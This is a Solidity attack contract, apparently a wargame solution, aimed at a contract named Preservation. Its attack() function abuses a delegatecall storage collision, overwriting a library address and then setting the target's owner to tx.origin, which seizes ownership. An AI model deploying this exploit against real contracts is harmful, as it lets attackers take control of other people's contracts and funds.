// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservatoin {
    function setFirstTime(uint _timeStamp) external;

    function setSecondTime(uint _timeStamp) external;
}

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address private owner;
    IPreservatoin private preservation;

    constructor(address _preservation) {
        preservation = IPreservatoin(_preservation);
    }

    function attack() external {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function setTime(uint _time) external {
        owner = tx.origin;
    }
}
